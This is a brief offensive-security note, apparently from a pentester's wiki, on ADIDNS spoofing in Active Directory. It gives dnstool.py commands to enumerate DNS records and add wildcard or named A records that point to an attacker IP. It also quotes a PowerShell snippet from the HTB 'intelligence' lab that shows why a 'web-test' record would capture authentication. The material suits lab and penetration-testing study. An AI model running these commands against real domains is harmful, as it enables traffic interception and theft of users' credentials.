---
title: ADIDNS Spoofing
draft: false
tags:
---
 
Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing

### WINS forward lookup (enumerate records)

The state of WINS forward lookup can be enumerated with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled.

```
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DC_FQDN'
```

### Manual record manipulation

An awesome Python alternative to Powermad's functions is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py). Theoretically, this script can be used to `add`, `modify`, `query`, `remove`, `resurrect` and `ldapdelete` records in ADIDNS.

```bash
# query a node
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController

# add a node and attach a record
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
```

If we know the type of record that is being captured, for example:
```
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
```

We can add:
```bash
dnstool.py -u 'DOMAIN\user' -p 'password' --record 'web-test' --action add --data $AttackerIP --type A DOMAIN_FQDN
```